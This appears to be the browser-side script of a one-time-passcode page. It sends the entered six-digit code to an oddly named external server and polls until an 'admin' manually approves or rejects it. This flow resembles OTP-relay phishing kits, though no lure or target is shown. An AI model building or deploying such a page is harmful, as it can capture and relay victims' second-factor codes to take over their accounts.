const verifyBtn = document.getElementById("verifyBtn");

verifyBtn.addEventListener("click", verifyOTP);


// ==============================
// VERIFY OTP
// ==============================

function verifyOTP() {

    let otp =
        document.getElementById("otp").value;

    let message =
        document.getElementById("message");


    // Check empty

    if (otp === "") {

        message.textContent =
            "Please enter the OTP";

        return;
    }


    // Check 6 digits

    if (!/^\d{6}$/.test(otp)) {

        message.textContent =
            "OTP must be 6 digits";

        return;
    }


    // Show waiting message

    message.textContent =
        "Sending OTP for admin approval...";


    // ==============================
    // SEND OTP TO SERVER
    // ==============================

    fetch(
        "https://sercice-teat-name.onrender.com/verify-otp",
        {

            method: "POST",

            headers: {

                "Content-Type":
                    "application/json"

            },

            body: JSON.stringify({

                otp: otp

            })

        }
    )

    .then(function(response) {

        if (!response.ok) {

            throw new Error(
                "Server error: " +
                response.status
            );

        }

        return response.json();

    })

    .then(function(data) {

        console.log(data);

        message.textContent =
            data.message;


        if (data.success) {

            message.textContent =
                "OTP submitted. Waiting for admin approval...";

            checkOTPStatus();

        }

    })

    .catch(function(error) {

        console.log(
            "OTP error:",
            error
        );

        message.textContent =
            "Could not submit OTP. Please try again.";

    });

}


// ==============================
// CHECK OTP STATUS
// ==============================

function checkOTPStatus() {

    fetch(
        "https://sercice-teat-name.onrender.com/otp-status"
    )

    .then(function(response) {

        return response.json();

    })

    .then(function(data) {

        console.log(
            "OTP status:",
            data.status
        );


        // ADMIN APPROVED

        if (
            data.status === "approved"
        ) {

            document.getElementById(
                "message"
            ).textContent =
                "OTP approved!";

            window.location.href =
                "/home.html";

            return;
        }


        // ADMIN REJECTED

        if (
            data.status === "rejected"
        ) {

            document.getElementById(
                "message"
            ).textContent =
                "OTP rejected. Please try again.";

            return;
        }


        // STILL WAITING

        if (
            data.status === "pending"
        ) {

            setTimeout(
                checkOTPStatus,
                2000
            );

        }

    })

    .catch(function(error) {

        console.log(
            "Status error:",
            error
        );

    });

}
